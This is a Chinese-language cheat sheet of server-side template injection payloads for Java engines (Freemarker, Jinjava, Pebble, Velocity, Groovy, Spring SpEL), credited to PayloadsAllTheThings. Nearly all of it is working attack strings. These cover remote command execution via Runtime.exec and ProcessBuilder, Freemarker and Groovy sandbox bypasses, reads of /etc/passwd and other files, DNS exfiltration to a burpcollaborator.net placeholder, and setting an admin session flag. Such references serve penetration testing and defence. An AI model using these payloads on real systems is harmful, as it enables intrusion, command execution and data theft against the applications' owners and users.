# SSTI Java - Java服务端模板注入

[SEARCH_KEYWORDS]
漏洞类型: SSTI Server-Side Template Injection 服务端模板注入
攻击类型: Remote Code Execution File Read Information Disclosure
关键词: SSTI Freemarker Thymeleaf Velocity Groovy SpEL Jinjava Pebble
技术: Expression Language OGNL SpEL Runtime.exec ProcessBuilder ClassLoader
框架: Freemarker Thymeleaf Velocity Groovy Spring SpEL Jinjava Pebble Codepen
函数: getClass() forName() getRuntime() exec() ProcessBuilder

[CONTENT]

## SSTI Java概述

服务端模板注入(SSTI)是一种安全漏洞，用户输入以不安全方式嵌入服务端模板时，攻击者可注入执行任意代码。Java中SSTI特别危险，因为Java模板引擎如JSP、Thymeleaf、FreeMarker功能强大。

## 模板库Payload格式

| 模板名 | Payload格式 |
|--------|-------------|
| Codepen | `#{}` |
| Freemarker | `${3*3}`, `#{3*3}`, `[=3*3]` |
| Groovy | `${9*9}` |
| Jinjava | `{{ }}` |
| Pebble | `{{ }}` |
| Spring | `*{7*7}` |
| Thymeleaf | `[[ ]]` |
| Velocity | `#set($X="") $X` |

## Java基本注入

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
```

### 获取环境变量

```java
${T(java.lang.System).getenv()}
```

### 读取/etc/passwd

```java
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
```

## Freemarker

### 基本注入

```js
${3*3}      // 默认
#{3*3}      // 旧版
[=3*3]      // FreeMarker 2.3.4+
```

### 读取文件

```js
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
```

### 命令执行

```js
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]
```

### 沙箱绕过 (< 2.3.30)

```js
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

## Jinjava

### 基本注入

```python
{{'a'.toUpperCase()}}  // 结果: 'A'
{{ request }}
```

### 命令执行

```ps1
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
```

## Pebble

### 基本注入

```java
{{ someString.toUPPERCASE() }}
```

### 命令执行

旧版 (< 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```

新版:
```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

## Velocity

```python
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

## Groovy

### 基本注入

```groovy
${9*9}
```

### 读取文件

```groovy
${String x = new File('c:/windows/notepad.exe').text}
${String x = new File('/path/to/file').getText('UTF-8')}
```

### HTTP请求

```groovy
${"http://www.google.com".toURL().text}
${new URL("http://www.google.com").getText()}
```

### 命令执行

```groovy
${"calc.exe".exec()}
${"calc.exe".execute()}
${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
```

### 沙箱绕过

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x }
```

## Spring Expression Language (SpEL)

### 基本注入

```java
${7*7}
${'patt'.toString().replace('a', 'x')}
```

### DNS外带

```java
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
```

### 修改Session属性

```java
${pageContext.request.getSession().setAttribute("admin",true)}
```

### 命令执行

```java
// 方法1: Runtime
${T(java.lang.Runtime).getRuntime().exec("COMMAND_HERE")}

// 方法2: invoke
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('COMMAND_HERE')}

// 方法3: ScriptEngineManager
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}

// 方法4: ProcessBuilder
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("ping x.x.x.x")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
```

## 参考文档

原始来源: PayloadsAllTheThings/Server Side Template Injection/Java.md